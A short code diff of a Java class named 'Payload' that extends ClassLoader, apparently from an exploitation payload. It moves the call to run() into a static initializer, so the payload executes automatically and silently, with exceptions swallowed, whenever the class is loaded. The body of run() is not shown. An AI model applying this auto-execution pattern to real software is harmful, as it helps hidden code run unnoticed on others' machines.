@@ -65,20 +65,14 @@ import java.util.StringTokenizer;
  */
 public class Payload extends ClassLoader {
 
-	static boolean alreadyRun = false;
+    static {
+        try {
+            run();
+        } catch (Exception e) {}
+    }
 
-	public Payload() throws Exception {
-		if (!alreadyRun) {
-			alreadyRun = true;
-			run();
-		}
-	}
-	public static void main(String[] ignored) throws Exception {
-		if (!alreadyRun) {
-			alreadyRun = true;
-			run();
-		}	
-	}
+	public static void main(String[] args) throws Exception {
+    }
 
 	public static void run() throws Exception {
 
